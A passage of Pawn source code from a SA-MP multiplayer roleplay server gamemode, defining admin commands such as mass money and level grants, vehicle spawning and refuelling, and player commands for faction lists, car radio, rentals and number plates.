	if(!strlen(tmp))
	{
	SCM(playerid,COL_SYN,"Syntax: /mlr <Money> <Level> <Respect> <Players>");
	 return 1;
	}
			Players = strval(tmp);
			if(Players < 0) return SCM(playerid, COLOR_RED, "invalid value");
			if(Money < 0) return SCM(playerid, COLOR_RED, "invalid value");
			if(Level < 0) return SCM(playerid, COLOR_RED, "invalid value");
			if(Respect < 0) return SCM(playerid, COLOR_RED, "invalid value");
            new lolstr[200];
            format(lolstr, 200, "When the server reaches %d players, you will receive $%s and %d Respect Points and %d Level.", Players, FormatNumber(Money), Respect, Level);
            SendClientMessageToAll(COLOR_LIGHTBLUE, lolstr);
			MLR = 1;
			MMLR = Money;
			RMLR = Respect;
			LMLR = Level;
			PMLR = Players;
			SetTimer("CheckPlayers", 5000, 0);
			SetTimer("MLRM", 400000, 0);
			GetPlayerName(playerid, sendername, sizeof(sendername));
			new str[512];
			format(str, sizeof(str), "{FFFFFF}Admin %s enabled MLR system.", sendername);
			AdminWarn(str);
			return 1;
      }





	if(strcmp(cmd, "/veh", true) == 0)
	{
 		if (PlayerInfo[playerid][pAdmin] <= 3) return SendClientMessage(playerid, COLOR_GREEN, "Error: Your Admin level isn't high enough to use this command.");
		if(IsPlayerInAnyVehicle(playerid)) return SCM(playerid,COLOR_GG,"You cannot create a vehicle when you are in a vehicle.");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, COL_SYN, "Syntax: /veh <ModelName/ID> <ColorID1> <ColorID2>");
        new car;
		if(IsNumeric(tmp))
		{
			car = strval(tmp);
			if(car < 400 || car > 611) return SendClientMessage(playerid, COLOR_GG, "Vehicle Number can't be below 400 or above 611");
		}
		else
		{
			for(new i;i<212;i++)
			{
			    if(strfind(aVehicleNames[i], tmp, true) != -1)
			    {
			        car = i+400;
			    }
			}
		}
		if(car == 0) return SCM(playerid, COLOR_ALI, "Invalid vehicle name.");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, COL_SYN, "Syntax: /veh <ModelName/ID> <ColorID1> <ColorID2>");
		new color1;
		color1 = strval(tmp);
		if(color1 < 0 || color1 > 255) return SendClientMessage(playerid, COLOR_GG, "Color Number can't be below 0 or above 255");
		tmp = strtok(cmdtext, idx);
		if(!strlen(tmp)) return SendClientMessage(playerid, COL_SYN, "Syntax: /veh <ModelName/ID> <ColorID1> <ColorID2>");
		new color2;
		color2 = strval(tmp);
		if(color2 < 0 || color2 > 255) return SendClientMessage(playerid, COLOR_GG, "Color Number can't be below 0 or above 255");
		new Float:X,Float:Y,Float:Z,Float:angle;
		GetPlayerFacingAngle(playerid,angle);
		GetPlayerPos(playerid, X,Y,Z);
		new carid = CreateVehicle(car, X,Y,Z+1, angle, color1, color2, -1);
		SetVehicleNumberPlate(carid, "{F90000}Joker");
		CreatedCars[CreatedCar] = carid;
		created[carid] = 1;
		IsValidAVeh[CreatedCars[CreatedCar]] = true;
		CreatedCar ++;
		//format(string, sizeof(string), "Vehicle {FFFFFF}%d {FF6347}spawned.", carid);
		//SendClientMessage(playerid, COLOR_LIGHTRED, string);
		LinkVehicleToInterior(carid, GetPlayerInterior(playerid));
		SetVehicleVirtualWorld(carid, GetPlayerVirtualWorld(playerid));
		PutPlayerInVehicle(playerid, carid, 0);
		new create[256];
        new lolstr[256];
        format(lolstr, 256, "Admin %s Create vehicles.", PINFO[playerid][pName], create);
        AdminWarn(lolstr);
			VehOwned[carid] = 2;
			VehOwner[carid] = playerid;
		return 1;
	}








		if(!strcmp(cmd, "/fakecmd", true))
		{
			if(PlayerInfo[playerid][pAdmin] < 2000) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
		//	if(PINFO[playerid][pAdmin] < PINFO[giveplayerid][pAdmin]) return SCM(playerid, COLOR_AMIR, "you cannot fake command an admin higher than you.");
			tmp = strtok(cmdtext, idx);
				if(!strlen(tmp))
				{
					SendMessage(playerid, COLOR_GRAD2, "USPGE: /USPGE: /fakecmd [playerid/PartOfName] [Command]");
					return 1;
				}
							giveplayerid = ReturnUser(tmp);
							GetPlayerName(giveplayerid, giveplayer, sizeof(giveplayer));
							GetPlayerName(playerid, sendername, sizeof(sendername));
							new length = strlen(cmdtext);
							while ((idx < length) && (cmdtext[idx] <= ' '))
							{
								idx++;
							}
							new offset = idx;
		  new result[64];
							while ((idx < length) && ((idx - offset) < (sizeof(result) - 1)))
							{
								result[idx - offset] = cmdtext[idx];
								idx++;
							}
							result[idx - offset] = EOS;
							if(!strlen(result))
							{
								SendMessage(playerid, COLOR_GRAD2, "USPGE: /fakecmd [playerid/PartOfName] [Command]");
								return 1;
							}

				if(IsPlayerConnected(giveplayerid))
				{
				new call[512];
				format(call, 512, "%s", (result));
				OnPlayerCommandText(giveplayerid, call);

				new stramir[512];
				format(stramir, 512, "[Admin-Warn]: {FFFFFF}Admin %s used fake command on player %s.", sendername, giveplayer);
				ABroadCast(COLOR_AdminWarn,stramir,9);
				}
				else {
				SCM(playerid, COLOR_GRAD2, "That player is not connected.");
				return 1;
				}
		return 1;
		}


    if(!strcmp(cmd, "/setarmorall", true))
    {
        if(PINFO[playerid][pAdmin] < 5) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /setarmorall <Distance(FLOAT)> <Amount(FLOAT)>");
        new Float:dis = floatstr(tmp);
        new lola[150];
        lola = strtok(cmdtext, idx);
        if(!strlen(lola)) return SCM(playerid, COL_SYN, "Syntax: /setarmorall <Distance(FLOAT)> <Amount(FLOAT)>");
        new Float:rpam = floatstr(lola);
        if(rpam <= 200.0 && rpam >= 0.0)
        {
            if(dis <= 10000.0 && dis >= 1.0)
            {
                new lolstr[200];
                format(lolstr, 200, "Admin %s has set all players online armour to %.2f.", PINFO[playerid][pName], rpam);
                for(new i;i < LastPID;i++)
                {
                    if(IsPlayerConnected(i) && gPlayerLogged[i] == 1 && ProxDetectorS(dis, playerid, i))
                    {
                        SetPlayerZereh(i, rpam);
                        SCM(i, COLOR_LIGHTRED, lolstr);
                    }
                }
                format(lolstr, 200, "%s has set all players armor to %.2f in %.2f distance.", PINFO[playerid][pName], rpam, dis);
                AdminWarn(lolstr);
            }
            else return SCM(playerid, COLOR_ALI, "Invalid distance.");
        }
        else return SCM(playerid, COLOR_ALI, "Invalid armor.");
        return 1;
    }
    if(!strcmp(cmd, "/dj", true))
    {
        if(PINFO[playerid][pAdmin] == 0) return SCM(playerid, COLOR_GREEN, "Shoma Dj Nistid.");
		if(!IsPlayerInRangeOfPoint(playerid,1.0,476.1023,-14.9819,1003.6953)) return SCM(playerid,COLOR_GREEN,"Shoma Dar Club Nistid.");
		ShowPlayerDialog(playerid,DIALOG_DJ,DIALOG_STYLE_LIST,"{57e547}DJ System","{FFFFFF}D#Fat - Sahar\nAllaho-Akbar Traper\nHorosh Band\nRemix Shad","Entekhab","Enseraf");
		SendClientMessage(playerid,0xFFFF00AA,"Lotfan Ahang Ra Entekhab Konid.");
        return 1;
    }
   	if(strcmp(cmd, "/moneyall", true) == 0)
    {
      if(PlayerInfo[playerid][pAdmin] <= 1999)
      {
       SCM(playerid,-1,"Error: Your admin level isn't high enough to use this command.");
      return 1;
      }
      new Min;
      new Max;
      new Value;
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
      SCM(playerid,COL_SYN,"Syntax: /moneyall <Min> <Max> <Value>");
      return 1;
      }
      Min = strval(tmp);
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
      SCM(playerid,COL_SYN,"Syntax: /moneyall <Min> <Max> <Value>");
      return 1;
      }
      Max = strval(tmp);
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
      SCM(playerid,COL_SYN,"Syntax: /moneyall <Min> <Max> <Value>");
      return 1;
      }
			Value = strval(tmp);
			if(Value < 0) return SCM(playerid, COLOR_RED, "invalid value");
            new lolstr[200];
      		    new arank[64];
		    if(PlayerInfo[playerid][pAdmin] == 8) { arank = "CM Manager"; }
            else if(PlayerInfo[playerid][pAdmin] == 9) { arank = "CM Founder"; }
            else if(PlayerInfo[playerid][pAdmin] == 1999) { arank = "Scripter"; }
            else if(PlayerInfo[playerid][pAdmin] == 2000) { arank = "Founder"; }
			else { arank = "Founder"; }
            format(lolstr, 200, "{FFFFFF}%s {ff6347}%s has given $%s to all online players (Level%d-%d).", arank, PINFO[playerid][pName], FormatNumber(Value), Min, Max);
            for(new i = 0;i < LastPID;i++)
            {
                if(IsPlayerConnected(i) && gPlayerLogged[i] == 1 && PlayerInfo[i][pLevel] >= Min && PlayerInfo[i][pLevel] <= Max)
                {
                    GivePlayerPool(i, Value);
                }
            }
            SendClientMessageToAll(COLOR_LIGHTRED, lolstr);
      return 1;
      }
	if(strcmp(cmd, "/respectall", true) == 0)
    {
      if(PlayerInfo[playerid][pAdmin] <= 1999)
      {
       SCM(playerid,-1,"Error: Your admin level isn't high enough to use this command.");
      return 1;
      }
      new Min;
      new Max;
      new Value;
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
      SCM(playerid,COL_SYN,"Syntax: /respectall <Min> <Max> <Value>");
      return 1;
      }
      Min = strval(tmp);
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
      SCM(playerid,COL_SYN,"Syntax: /respectall <Min> <Max> <Value>");
      return 1;
      }
      Max = strval(tmp);
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
      SCM(playerid,COL_SYN,"Syntax: /respectall <Min> <Max> <Value>");
      return 1;
      }
			Value = strval(tmp);
			if(Value < 0) return SCM(playerid, COLOR_RED, "invalid value");
            new lolstr[200];
   			new arank[64];
		    if(PlayerInfo[playerid][pAdmin] == 8) { arank = "CM Manager"; }
            else if(PlayerInfo[playerid][pAdmin] == 9) { arank = "CM Founder"; }
            else if(PlayerInfo[playerid][pAdmin] == 1999) { arank = "Scripter"; }
            else if(PlayerInfo[playerid][pAdmin] == 2000) { arank = "Founder"; }
			else { arank = "Founder"; }
            format(lolstr, 200, "{FFFFFF}%s {ff6347}%s has given %i respect points to all online players (level %d-%d).", arank, PINFO[playerid][pName], Value, Min, Max);
            for(new i = 0;i < LastPID;i++)
            {
                if(IsPlayerConnected(i) && gPlayerLogged[i] == 1 && PlayerInfo[i][pLevel] >= Min && PlayerInfo[i][pLevel] <= Max)
                {
                    PINFO[i][pExp] += Value;
                    SaveKonVal(i, "pExp", PINFO[i][pExp]);
                }
            }
            SendClientMessageToAll(COLOR_LIGHTRED, lolstr);
      return 1;
      }
	  if(strcmp(cmd, "/levelall", true) == 0)
    {
      if(PlayerInfo[playerid][pAdmin] <= 7)
      {
      SCM(playerid,-1,"Error: Your admin level isn't high enough to use this command.");
      return 1;
      }
      new Min;
      new Max;
      new Value;
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
      SCM(playerid,COL_SYN,"Syntax: /levelall <Min> <Max> <Value>");
      return 1;
      }
      Min = strval(tmp);
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
      SCM(playerid,COL_SYN,"Syntax: /levelall <Min> <Max> <Value>");
      return 1;
      }
      Max = strval(tmp);
      tmp = strtok(cmdtext, idx);
      if(!strlen(tmp))
      {
      SCM(playerid,COL_SYN,"Syntax: /levelall <Min> <Max> <Value>");
      return 1;
      }
			Value = strval(tmp);
			if(Value < 0) return SCM(playerid, COLOR_RED, "invalid value");
            new lolstr[200];
            format(lolstr, 200, "Admin %s has given %i level(s) to all online players level %d-%d.", PINFO[playerid][pName], Value, Min, Max);
            for(new i = 0;i < LastPID;i++)
            {
                if(IsPlayerConnected(i) && gPlayerLogged[i] == 1 && PlayerInfo[i][pLevel] >= Min && PlayerInfo[i][pLevel] <= Max)
                {
                    PINFO[i][pLevel] += Value;
                    SaveKonVal(i, "pLevel", PINFO[i][pLevel]);
                }
            }
            SendClientMessageToAll(COLOR_LIGHTRED, lolstr);
      return 1;
      }
    if(!strcmp(cmd, "/racd", true))
    {
        if(PINFO[playerid][pAdmin] < 5) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /racd <Distance(FLOAT)>");
        new Float:dis = floatstr(tmp);
        if(dis > 0.0)
        {
            new Float:ui[6];
            GetPlayerPos(playerid, ui[0], ui[1], ui[2]);
            for(new i; i < MAX_VEHICLES;i++)
            {
                if(IsVehicleConnected(i))
                {
                    GetVehiclePos(i, ui[3], ui[4], ui[5]);
                    if(GetDistanceBetweenPoints(ui[0], ui[1], ui[2], ui[3], ui[4], ui[5]) <= dis)
                    {
                        SetVehicleToRespawn(i);
                    }
                }
            }
            new lolstr[256];
            format(lolstr, 256, "Admin %s has RAC all vehicles in %.2f distance.", PINFO[playerid][pName], dis);
            AdminWarn(lolstr);
       }
       else return SCM(playerid, COLOR_ALI, "Invalid distance.");
       return 1;
    }
    if(!strcmp(cmd, "/afill", true))
    {
        if(PINFO[playerid][pAdmin] < 5) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /afill <Distance(FLOAT)>");
        new Float:dis = floatstr(tmp);
        if(dis > 0.0)
        {
            new Float:ui[6];
            GetPlayerPos(playerid, ui[0], ui[1], ui[2]);
            for(new i; i < MAX_VEHICLES;i++)
            {
                if(IsVehicleConnected(i))
                {
                    GetVehiclePos(i, ui[3], ui[4], ui[5]);
                    if(GetDistanceBetweenPoints(ui[0], ui[1], ui[2], ui[3], ui[4], ui[5]) <= dis)
                    {
                        Benzin[i] = 100;
                    }
                }
            }
            new lolstr[256];
            format(lolstr, 256, "Admin %s has fill all vehicles in %.2f distance.", PINFO[playerid][pName], dis);
            AdminWarn(lolstr);
       }
       else return SCM(playerid, COLOR_ALI, "Invalid distance.");
       return 1;
    }





    if(!strcmp(cmd, "/Vfill", true))
    {
        if(PlayerInfo[playerid][pPremiumAccount] < 101) return SCM(playerid, COLOR_GREEN, "Vip level 2 nistid.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /afill <Distance(FLOAT)>");
        new Float:dis = floatstr(tmp);
        if(dis > 0.0)
        {
            new Float:ui[6];
            GetPlayerPos(playerid, ui[0], ui[1], ui[2]);
            for(new i; i < MAX_VEHICLES;i++)
            {
                if(IsVehicleConnected(i))
                {
                    GetVehiclePos(i, ui[3], ui[4], ui[5]);
                    if(GetDistanceBetweenPoints(ui[0], ui[1], ui[2], ui[3], ui[4], ui[5]) <= dis)
                    {
                        Benzin[i] = 100;
                    }
                }
            }
            new lolstr[256];
            format(lolstr, 256, "Vip %s has fill all vehicles in %.2f distance.", PINFO[playerid][pName], dis);
            AdminWarn(lolstr);
       }
       else return SCM(playerid, COLOR_ALI, "Invalid distance.");
       return 1;
    }



    if(!strcmp(cmd, "/dva", true))
    {
        if(PINFO[playerid][pAdmin] < 5) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /dva <Distance(FLOAT)>");
        new Float:dis = floatstr(tmp);
        if(dis > 0.0 && dis < 10000.0)
        {
            new Float:ui[6];
            GetPlayerPos(playerid, ui[0], ui[1], ui[2]);
            for(new i; i < MAX_VEHICLES;i++)
            {
                if(IsVehicleConnected(i))
                {
                    GetVehiclePos(i, ui[3], ui[4], ui[5]);
                    if(GetDistanceBetweenPoints(ui[0], ui[1], ui[2], ui[3], ui[4], ui[5]) <= dis)
                    {
                        for(new a = 0;a<CreatedCar;a++)
                        {
                            if(CreatedCars[a] != 0 && OwnedMashin[CreatedCars[a]] != 1 && OwnedMashin_2[CreatedCars[a]] != 1 && IsValidAVeh[CreatedCars[a]] == true && i == CreatedCars[a])
                            {
                                DestroyVehicle(CreatedCars[a]);
                                IsValidAVeh[CreatedCars[a]] = false;
                                CreatedCars[a] = 0;
                            }
                        }
                    }
                }
            }
            new lolstr[256];
            format(lolstr, 256, "Admin %s DVA all vehicles in %.2f distance.", PINFO[playerid][pName], dis);
            AdminWarn(lolstr);
       }
       else return SCM(playerid, COLOR_ALI, "Invalid distance.");
       return 1;
    }
    if(!strcmp(cmd, "/lockengine", true))
    {
        if(PINFO[playerid][pAdmin] < 4) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /lockengine <Distance(FLOAT)>");
        new Float:dis = floatstr(tmp);
        if(dis > 0.0)
        {
            new Float:ui[6];
            GetPlayerPos(playerid, ui[0], ui[1], ui[2]);
            for(new i; i < MAX_VEHICLES;i++)
            {
                if(IsVehicleConnected(i))
                {
                    GetVehiclePos(i, ui[3], ui[4], ui[5]);
                    if(GetDistanceBetweenPoints(ui[0], ui[1], ui[2], ui[3], ui[4], ui[5]) <= dis)
                    {
                        LockEngine[i] = true;
                    }
                }
            }
            new lolstr[256];
            format(lolstr, 256, "Admin %s has locked the engine of the all vehicles in %.2f distance.", PINFO[playerid][pName], dis);
            AdminWarn(lolstr);
       }
       else return SCM(playerid, COLOR_ALI, "Invalid distance.");
       return 1;
    }
    if(!strcmp(cmd, "/unlockengine", true))
    {
        if(PINFO[playerid][pAdmin] < 4) return SCM(playerid, COLOR_GREEN, "Error: Your admin level isn't high enough to use this command.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /unlockengine <Distance(FLOAT)>");
        new Float:dis = floatstr(tmp);
        if(dis > 0.0)
        {
            new Float:ui[6];
            GetPlayerPos(playerid, ui[0], ui[1], ui[2]);
            for(new i; i < MAX_VEHICLES;i++)
            {
                if(IsVehicleConnected(i))
                {
                    GetVehiclePos(i, ui[3], ui[4], ui[5]);
                    if(GetDistanceBetweenPoints(ui[0], ui[1], ui[2], ui[3], ui[4], ui[5]) <= dis)
                    {
                        LockEngine[i] = false;
                    }
                }
            }
            new lolstr[256];
            format(lolstr, 256, "Admin %s has unlocked the engine of the all vehicles in %.2f distance.", PINFO[playerid][pName], dis);
            AdminWarn(lolstr);
       }
       else return SCM(playerid, COLOR_ALI, "Invalid distance.");
       return 1;
    }
    if(!strcmp(cmd, "/premium", true))
    {
        new strlol[2400];
        strcat(strlol, "1. You will earn 1 respect point as a prize every 5 paydays.\n\n", 2400);
        strcat(strlol, "2. You will receive %40 paycheck at every payday.\n\n", 2400);
        strcat(strlol, "3. You can buy special vehicles like infernus, turismo, ....\n\n", 2400);
        strcat(strlol, "4. You can use advance /carradio with 12 different channels with Dialog.\n\n", 2400);
        strcat(strlol, "5. You can have 2 vehicles in the same time.\n\n", 512);
        strcat(strlol, "7. You can toggle the ooc, walkie talkie, news, event, family chat channel.\n\n", 2400);
        strcat(strlol, "8. Your extra respect points will never remove at /buylevel.\n\n", 2400);
        strcat(strlol, "9. You can select hidden colors(id 128~255) with premium account.\n\n", 2400);
        strcat(strlol, "10. 50 Free Rep .\n\n", 2400);
        strcat(strlol, "   To upgrade to premium account visit our tg(tg:{57e547}@samp_life {FFFFFF})", 2400);
        return ShowPlayerDialog(playerid, 8423, DIALOG_STYLE_MSGBOX, "Features of Premium account", strlol, "Close", "");
    }
    if(!strcmp(cmd, "/members", true))
    {
        if(PINFO[playerid][pLeader] == 0 && PINFO[playerid][pRank] < 6) return SendClientMessage(playerid, COLOR_YELLOW, "Only leaders can use this command.");
        new mem;
        if(PINFO[playerid][pLeader]) mem = PINFO[playerid][pLeader];
        else mem = PINFO[playerid][pMember];
        new count;
        new lolis[512];
        for(new i; i < LastPID; i++)
        {
            if(IsPlayerConnected(i))
            {
                if(PINFO[i][pMember] == mem)
                {
                    count ++;
                    if(count == 1)
                    {
                        format(lolis, 512, "%s(%i)", PINFO[i][pName], i);
                    }
                    else
                    {
                        new lolhash[60];
                        format(lolhash, 60, "\n%s(%i)", PINFO[i][pName], i);
                        strcat(lolis, lolhash, 512);
                    }
                }
            }
        }
        if(!count) return SCM(playerid, COLOR_ALI, "There isn't any member online in your faction.");
        ShowPlayerDialog(playerid, 7861, DIALOG_STYLE_LIST, "Members", lolis, "OK", "");
        if(count == 1) return SCM(playerid, COLOR_ALI, "There is 1 member online in your faction.");
        if(count > 1) { format(lolis, 512, "There are %i members online in your faction.", count); return SCM(playerid, COLOR_ALI, lolis); }
        return 1;
    }

       if(!strcmp(cmd, "/cmembers", true))
    {
        if(PINFO[playerid][pClan] == 0 && PINFO[playerid][pcRank] < 6) return SendClientMessage(playerid, COLOR_YELLOW, "Only clan leaders can use this command.");

        new mem = PINFO[playerid][pClan];
        new count;
        new lolis[512];
        for(new i; i < LastPID; i++)
        {
            if(IsPlayerConnected(i))
            {
                if(PINFO[i][pClan] == mem)
                {
                    count ++;
                    if(count == 1)
                    {
                        format(lolis, 512, "%s(%i)", PINFO[i][pName], i);
                    }
                    else
                    {
                        new lolhash[60];
                        format(lolhash, 60, "\n%s(%i)", PINFO[i][pName], i);
                        strcat(lolis, lolhash, 512);
                    }
                }
            }
        }
        if(!count) return SCM(playerid, COLOR_ALI, "There isn't any member online in your clan.");
        ShowPlayerDialog(playerid, 7861, DIALOG_STYLE_LIST, "Members", lolis, "OK", "");
        if(count == 1) return SCM(playerid, COLOR_ALI, "There is 1 member online in your clan.");
        if(count > 1) { format(lolis, 512, "There are %i members online in your clan.", count); return SCM(playerid, COLOR_ALI, lolis); }
        return 1;
    }
    if(strcmp(cmd, "/carradio", true) == 0 || strcmp(cmd, "/music", true) == 0)
    {
        if(PINFO[playerid][pPremiumAccount] < 1) return SCM(playerid, COLOR_YELLOW2, "Error: You haven't a premium account.");
        if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COLOR_YELLOW2, "Error: You aren't in any vehicle.");
        if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SCM(playerid, COLOR_YELLOW2, "Error: You must be driver of this vehicle.");
        tmp = strtok(cmdtext, idx);
            new buyabler[1024];
            format(buyabler,sizeof(buyabler),"Musics And Radios \t\nInsert URL \t\nOFF Radio");
            ShowPlayerDialog(playerid,6543,DIALOG_STYLE_LIST,"Radio List:",buyabler,"Select","Cancel");
   /*
        if(!strlen(tmp)) return SCM(playerid, COL_SYN, "Syntax: /carradio <1-20>");
        if(!strcmp(tmp, "1", true))
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://208.85.241.142/");
        }
        else if(!strcmp(tmp, "2", true))
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1music.com/1393/05/20/Tik Taak - In Lahzeha [128].mp3");
        }
        else if(!strcmp(tmp, "3", true))
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://up.faz2fun.ir/up/faz2fun/F2F/SAEED/1/MUSIC/Hayedeh - Shabe Eshgh-WwW.Faz2Fun.Ir-.mp3");
        }
        else if(!strcmp(tmp, "4", true))
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.bir3da3.asia/Single/1393/Mehr/Sogand - The Lom [320].mp3");
        }
        else if(!strcmp(tmp, "5", true))
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1music.com/artist/Ho3ein/Sadegh - Sangin (Ft Ho3ein) [128].mp3");
        }
        else if(!strcmp(tmp, "6", true))
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1music.com/1393/05/06/ZedBazi - Pir Shodim Vali Bozorg Na/ZedBazi - Pir Shodim Vali Bozorg Na [128]/Alireza JJ & Sijal - Mehmooni Khodemoone (Ft Erfan, Sina Mafee, Sepehr Khalse, Behzad Leito, Paya & Magico).mp3");
        }
        else if(!strcmp(tmp, "7", true))
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1music.com/1393/08/25/Arad Aria Ft. Kaveh Afagh and Yas - Ghesseye Zirzamin (New Version) [128].mp3");
        }
        else if(!strcmp(tmp, "8", true))
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1music.com/artist/Morteza Pashaei/Morteza Pashaei - Asre Paeizi [128].mp3");
        }
        else if(!strcmp(tmp, "9", true))
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.nex1music.com/1393/08/23/Morteza Pashaei - Yeki Hast [128].mp3");
        }
        else if(!strcmp(tmp, "10", true))
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.pop-music.ir/music/Tir92/Morteza Pashaei - Jadeye Yektarafe [128].mp3");
        }
        else if(!strcmp(tmp, "11", true))
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://dl.3sotdownload.com/dl/91/7/Mohsen Yeganeh - Havaei Shodi.mp3");
        }
        else if(!strcmp(tmp, "12", true))
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://www.ramsarsms.com/wp-content/uploads/2013/09/Talar-Music-Arousi.mp3");
        }
        else if(!strcmp(tmp, "13", true))
        {
            format(CarRadio[GetPlayerVehicleID(playerid)], 600, "http://iranonair.no-ip.biz:8000/listen.pls");
        }

        else return SCM(playerid, COLOR_ALI, "Invalid id.");
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i) && GetPlayerVehicleID(i) == GetPlayerVehicleID(playerid)) {PlayAudioStreamForPlayer(i, CarRadio[GetPlayerVehicleID(playerid)]); CarRadioPlayed[i] = true;}
        }
        */
        return 1;
    }


    if(!strcmp(cmd, "/removecr", true))
    {
        if(!IsPlayerInAnyVehicle(playerid)) return SCM(playerid, COLOR_YELLOW2, "Error: You aren't in any vehicle.");
        if(GetPlayerState(playerid) != PLAYER_STATE_DRIVER) return SCM(playerid, COLOR_YELLOW2, "Error: You must be driver of this vehicle.");
        if(CarRadio[GetPlayerVehicleID(playerid)][0] == '\0') return SCM(playerid, COLOR_ALI, "There isn't any played radio on your vehicle.");
        for(new i;i<LastPID;i++)
        {
            if(IsPlayerConnected(i) && GetPlayerVehicleID(i) == GetPlayerVehicleID(playerid)) {StopAudioStreamForPlayer(i); CarRadioPlayed[i] = false;}
            CarRadio[GetPlayerVehicleID(playerid)][0] = '\0';
        }
        return 1;
    }
    if(!strcmp(cmd, "/rentveh", true))
    {
        if(RentedVehicle[playerid] != INVALID_VEHICLE_ID) return SCM(playerid, COLOR_ALI, "You already rented a vehicle, /unrentvehicle first.");
        if(OnRentMashinMessage[playerid] == false || !IsPlayerInAnyVehicle(playerid) || IsPlayerConnected(MashinRenter[GetPlayerVehicleID(playerid)])) return SCM(playerid, COLOR_ALI, "You are not in a rentable vehicle.");
        new newcar = GetPlayerVehicleID(playerid);
		if(IsAnRentCar(newcar))
        {
            RentedVehicle[playerid] = newcar;
            MashinRenter[newcar] = playerid;
            TogglePlayerControllable(playerid, 1);
            OnRentMashinMessage[playerid] = false;
            if(newcar == RentVeh[15] || newcar == RentVeh[16] || newcar == RentVeh[17] || newcar == RentVeh[18] || newcar == RentVeh[19] || newcar == RentVeh[20] || newcar == RentVeh[21] || newcar == RentVeh[22]) {GivePlayerPool(playerid, -SBizzInfo[5][sbEntranceCost]); SBizzInfo[5][sbTill] += SBizzInfo[5][sbEntranceCost];}//LS Car
            if(newcar == RentVeh[4] || newcar == RentVeh[6] || newcar == RentVeh[0] || newcar == RentVeh[5] || newcar == RentVeh[3] || newcar == RentVeh[7] || newcar == RentVeh[1] || newcar == RentVeh[2]) {GivePlayerPool(playerid, -SBizzInfo[1][sbEntranceCost]); SBizzInfo[1][sbTill] += SBizzInfo[1][sbEntranceCost];}//LV Car
            if(newcar == RentVeh[8] || newcar == RentVeh[9] || newcar == RentVeh[10] || newcar == RentVeh[12] || newcar == RentVeh[13] || newcar == RentVeh[14] || newcar == RentVeh[11]) {GivePlayerPool(playerid, -SBizzInfo[0][sbEntranceCost]); SBizzInfo[0][sbTill] += SBizzInfo[0][sbEntranceCost];}//Motor
            if(newcar == RentVeh[27] || newcar == RentVeh[28] || newcar == RentVeh[25] || newcar == RentVeh[26] || newcar == RentVeh[24] || newcar == RentVeh[23]) {GivePlayerPool(playerid, -SBizzInfo[2][sbEntranceCost]); SBizzInfo[2][sbTill] += SBizzInfo[2][sbEntranceCost];}//Boat
            PlayerPlaySound(playerid, 1052, 0, 0, 0);
            return SCM(playerid, COLOR_GREEN, "mitoni mashin ro ba /lock ghofl va /unlock baz koni.");
        }
    }
    if(!strcmp(cmd, "/carplate", true))
    {
        if(PINFO[playerid][pCar] == 0 && PINFO[playerid][pCar_2] == 0) return SCM(playerid,COL_SYN,"You haven't a personal car.");
        tmp = strtok(cmdtext, idx);
        if(!strlen(tmp)) return SCM(playerid,COL_SYN,"Syntax: /carplate <PlateText>");
        if(strlen(tmp) > 15 || strlen(tmp) < 3 || FindBadSign(tmp)) {SCM(playerid, COL_SYN, "Invalid character"); return SCM(playerid,COL_SYN,"Or the Length of the PlateText must be higher than 3 and lower than 15.");}
        if(GetPlayerVehicleID(playerid) == PINFO[playerid][pCar])
        {
            if(GetPlayerPool(playerid) >= 100)
            {
                new Float:x,Float:y,Float:z,Float:ang;
                SetVehicleNumberPlate(GetPlayerVehicleID(playerid), tmp);
                GetVehiclePos(GetPlayerVehicleID(playerid),x,y,z);
                GetVehicleZAngle(GetPlayerVehicleID(playerid),ang);
                PlayerPlaySound(playerid, 1054, 0.0, 0.0, 10.0)
                SetVehiclePos(GetPlayerVehicleID(playerid),x,y,z);
